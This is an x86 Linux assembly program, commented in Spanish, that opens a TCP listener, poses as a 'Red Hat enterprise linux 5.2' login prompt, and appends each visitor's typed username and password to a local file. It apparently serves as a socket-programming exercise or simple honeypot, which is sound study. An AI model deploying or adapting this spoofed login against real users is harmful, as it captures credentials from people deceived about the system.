section .data
	BIND_PORT				: equ 	01700h
	MEN_RESB				: equ	020h
	CERO					: equ	0
	
	SYS_INT					: equ	80h
	SYSCALL_EXIT			: equ 	1
	SYSCALL_FORK			: equ 	2
	SYSCALL_READ			: equ 	3
	SYSCALL_WRITE			: equ 	4
	SYSCALL_OPEN			: equ 	5
	SYSCALL_CLOSE			: equ 	6
	SYSCALL_KILL			: equ	37
	SYSCALL_SOCKET			: equ 	102
	SYSCALL_SOCKET_SOCKET	: equ 	1
	SYSCALL_SOCKET_BIND		: equ 	2
	SYSCALL_SOCKET_LISTEN	: equ 	4
	SYSCALL_SOCKET_ACCEPT	: equ 	5

	SIGKILL					: equ 	9

	AF_INET					: equ 	2
	SOCK_STREAM				: equ 	1
	IPPROTO_TCP				: equ 	6
	
	ACCEPT_ADDR				: equ	0
	ACCEPT_ADDR_LEN			: equ	0

	STDOUT					: equ 	1
	WRITE_APPEND			: equ 	09h
	
	encabezado_MSG			: db 	'Red Hat enterprise linux 5.2', 10
	ENCABEZADO_LEN			: equ 	29
	
	usuario_MSG				: db 	'login: '
	USUARIO_MSG_LEN				: equ 	7

	
	BUFFER_USER_LEN			: equ 	200
	buffer_user_read_len	: dd 	0h
	
	pass_MSG				: db 	'password: '
	pass_len				: equ 	10	

	BUFFER_PASS_LEN			: equ 	200
	buffer_pass_read_len	: dd 	0h
	
	buffer_close_len		: equ 	4
	buffer_close_read_len	: dd 	0h
	
	MSG_EXIT				: db 	'Digite exit para cerrar', 10
	MSG_EXIT_LEN			: equ 	24
	
	exit_Word				: db	'exit',13,10
	
	process_PID				: dd	0h
	
	nombreArchivo			: db 	'userPass.txt',0
	archivo_FD				: dd 	0h

	comma					: db 	' , '
	COMMA_LEN				: equ 	3

	error					: db 	'Error', 10
	errorBind				: db 	'Error Bind', 10
	errorListen				: db 	'Error listen', 10
	errorAccept				: db 	'Error Accept', 10
	ERROR_LEN				: equ	1
	CONVERTIR_NUMERO		: equ 	48
	
	END_INTRO				: equ 	2
		
	SOCK_FD					: dd  	0h
	ADDR_LEN				: equ  	010h
	QUEUE_LEN				: equ	01h
	
	SOCKET_CONECTION_FD		: dd  	0h

section .bss
	buffer_pass		resb	200
	buffer_user		resb 	200
	buffer_close	resb	4

section .text
	global _start

_start:
	;preparacion de la pila para almacenar la estructura del socket
	sub 	esp, 					MEN_RESB

	;la creacion de un socket requiere mas de 5 argumentos y
	;se realiza en varias etapas.
	;1) Creacion del socket
	;sockfd = socket(int socket_family, int socket_type, int protocol)
	mov 	eax, 					SYSCALL_SOCKET;
	mov 	ebx, 					SYSCALL_SOCKET_SOCKET;	
	mov 	dword [esp], 			AF_INET;			
	mov 	dword [esp + 04h],		SOCK_STREAM;		
	mov 	dword [esp + 08h],		IPPROTO_TCP;		
	mov 	ecx,					esp;			
	int  	SYS_INT; 
	cmp		eax, 					CERO
	jl		imprimirError
	
	;Se almacena el file descriptor
	mov		[SOCK_FD],				eax
	
	;2) Se hace el enlace
	;bind(int sockfd, const struct sockaddr *addr,
        ;socklen_t addrlen);

	;struct sockaddr {
	;    sa_family_t sa_family;
	;    char        sa_data[]; Puerto
	;}

	xor		edx,					edx
	mov		word 	[esp + 0Ch], 	AF_INET
	mov		word 	[esp + 0Eh],	BIND_PORT	; IMPORTANTE!!! : 
							;DEBE ESTAR
							;EN ORDEN REVERSA, 
							;dos días de atraso
							;por no saberlo!!!!
	mov		dword	[esp], 			eax
	lea		ebx, 					[esp + 0Ch]
	mov		[esp + 04h],			ebx
	mov		dword	[esp + 08h], 	ADDR_LEN
	mov		eax, 					SYSCALL_SOCKET
	mov		ebx,					SYSCALL_SOCKET_BIND
	int 	SYS_INT
	cmp		eax, 					CERO
	jl		imprimirError
	
	;3)Se coloca a escuchar.
	;int listen(int sockfd, int backlog);
	mov		eax, 					[SOCK_FD]
	mov		[esp],					eax
	mov		dword 	[esp + 04h], 	QUEUE_LEN;Tamano maximo de la cola
	mov		eax, 					SYSCALL_SOCKET
	mov		ebx, 					SYSCALL_SOCKET_LISTEN
	int 	SYS_INT
	cmp		eax, 					CERO
	jl		imprimirError
	
	;Se abre el archivo en modo Escritura y "Append"
	;int open(const char *pathname, int flags)
	mov		eax, 					SYSCALL_OPEN
	mov 	ebx, 					nombreArchivo
	mov		ecx,					WRITE_APPEND
	int 	SYS_INT
	mov 	[archivo_FD], 			eax	
	cmp		eax, 					CERO
	jl		imprimirError
	
	;Se crea un subProceso que acepta y trabaja con las conexiones,
	;el proceso padre, espera escuchando el teclado hasta 
	;la palabra "exit"
	xor		ebx,					ebx	
	mov 	eax,					SYSCALL_FORK
	int 	SYS_INT
	cmp 	eax,					CERO
	je		acceptSocket
	mov 	[process_PID],			eax
	
	;write(int fd, const void *buf, size_t count)
	mov 	eax, 					SYSCALL_WRITE
	mov 	ebx, 					STDOUT 
	mov 	ecx, 					MSG_EXIT
	mov 	edx, 					MSG_EXIT_LEN
	int 	SYS_INT
	
	call	waitClose
	
;Escucha el la consola hasta recibir para "exit"
waitClose:
	;read(int fd, void *buf, size_t count)
	mov 	eax, 					SYSCALL_READ 
	mov 	ebx, 					STDOUT 
	mov 	ecx, 					buffer_close
	mov 	edx, 					buffer_close_len
	int 	SYS_INT
	cmp 	eax, 					CERO
	jle		waitClose

	mov		esi, 					buffer_close
	mov		edi,					exit_Word
	cmpsb
	je		closeAndFinish
	call 	waitClose
	
;Cierra y termina el subProceso y termina la aplicacion
closeAndFinish:
	;Termina el subProceso
	;kill(pid_t pid, int sig)
	mov 	eax,					SYSCALL_KILL
	mov 	ebx,					[process_PID]
	mov 	ecx,					SIGKILL
	int 	SYS_INT
	
	;Cierra el servidor
	;close(int fd)
	mov 	eax,					SYSCALL_CLOSE 
	mov 	ebx, 					[SOCK_FD]
	int 	SYS_INT
	
	;Cierra el archivo
	mov 	eax,					SYSCALL_CLOSE 
	mov 	ebx, 					[archivo_FD]
	int 	SYS_INT	
	
	;Termina la aplicacion
	;exit(int status)
	mov 	eax,					SYSCALL_EXIT
	mov 	ebx, 					CERO
	int 	SYS_INT 			

;Procesa todas las conexiones entrantes
acceptSocket:
	;4)Aceptar la conexion
	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	
	push 	ACCEPT_ADDR_LEN
	push 	ACCEPT_ADDR
	push 	dword [SOCK_FD]
	mov		ecx,					esp
	mov		eax,					SYSCALL_SOCKET
	mov		ebx, 					SYSCALL_SOCKET_ACCEPT
	int		SYS_INT
	cmp		eax, 					CERO
	jl		imprimirError
	mov		[SOCKET_CONECTION_FD],		eax
	
	;Envia el encabezado
	mov		eax,					SYSCALL_WRITE
	mov		ebx,					[SOCKET_CONECTION_FD]
	mov		ecx, 					encabezado_MSG
	mov		edx, 					ENCABEZADO_LEN
	int		SYS_INT
	
	;Envia la palabra login
	mov		eax,					SYSCALL_WRITE
	mov		ebx,					[SOCKET_CONECTION_FD]
	mov		ecx, 					usuario_MSG
	mov		edx, 					USUARIO_MSG_LEN
	int		SYS_INT
	
	;espera respuesta
	call	readUser

	;Envia palabra password
	mov		eax,					SYSCALL_WRITE
	mov		ebx,					[SOCKET_CONECTION_FD]
	mov		ecx, 					pass_MSG
	mov		edx, 					pass_len
	int		SYS_INT	
	
	;espera respuesta
	call 	readPass

	;Escribe el usuario 
	mov		eax,					SYSCALL_WRITE
	mov		ebx,					[archivo_FD]
	mov		ecx, 					buffer_user
	mov		edx, 					[buffer_user_read_len]
	int		SYS_INT
	
	;Escribe la coma
	mov		eax,					SYSCALL_WRITE
	mov		ebx,					[archivo_FD]
	mov		ecx, 					comma
	mov		edx, 					COMMA_LEN
	int		SYS_INT
	
	;Escribe la contraseña
	mov		eax,					SYSCALL_WRITE
	mov		ebx,					[archivo_FD]
	mov		ecx, 					buffer_pass
	mov		edx, 					[buffer_pass_read_len]
	int		SYS_INT		
	
	;Cierra la conexion
	mov 	eax,					SYSCALL_CLOSE 
	mov 	ebx, 					[SOCKET_CONECTION_FD]
	int 	SYS_INT
	
	;llamada "recursiva"
	call 	acceptSocket

;Ajusta los buffers del usuario en los registros
readUser:
	mov		ecx, 					buffer_user
	mov		edx, 					BUFFER_USER_LEN
	call	read
	;se borran los ultimos dos caracteres, el fin de linea y el enter
	sub		eax,					END_INTRO
	;numero de caracteres leidos
	mov 	[buffer_user_read_len],	eax
	ret

;Ajusta los buffers para las contraseñas en los registros
readPass:
	mov		ecx, 					buffer_pass
	mov		edx, 					BUFFER_PASS_LEN
	call	read
	;almacena el numero de caracteres leidos
	mov 	[buffer_pass_read_len],	eax
	ret

;Espera hasta recibir informacion desde la conexion
read:
	mov		eax,					SYSCALL_READ
	mov		ebx,					[SOCKET_CONECTION_FD]
	int		SYS_INT	
	cmp 	eax, 					CERO
	jle		read
	ret

;Si hubo un error se imprime el valor del errno.
imprimirError:
	neg 	eax
	add 	eax, 					CONVERTIR_NUMERO
	mov 	[error], 				eax
	mov 	eax, 					SYSCALL_WRITE 
	mov 	ebx, 					STDOUT 
	mov 	ecx, 					error
	mov 	edx, 					ERROR_LEN
	int 	SYS_INT 			

	call	closeAndFinish

